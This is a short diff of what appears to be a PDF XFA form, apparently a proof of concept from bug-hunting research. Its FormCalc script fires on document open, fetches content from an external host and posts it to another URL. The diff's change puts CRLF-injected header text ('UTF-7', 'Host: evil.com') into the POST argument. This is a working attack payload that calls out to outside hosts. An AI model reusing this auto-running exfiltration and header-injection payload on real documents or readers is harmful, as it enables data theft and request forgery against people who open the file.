@@ -13,7 +13,7 @@ stream
             <event activity="initialize">
                 <script contentType='application/x-formcalc'>
                     var content = GET("https://bughunt1307.herokuapp.com")
-                    POST("https://bughunt1307.herokuapp.com/post.php",content,"application/x-www-form-urlencoded","xxxxxx&#xD;&#xA;test: test&#xD;&#xA;")
+                    POST("https://bughunt1307.herokuapp.com/post.php",content,"application/x-www-form-urlencoded","UTF-7&#xD;&#xA;Host: evil.com&#xD;&#xA;")
                 </script>
             </event>
         </field>
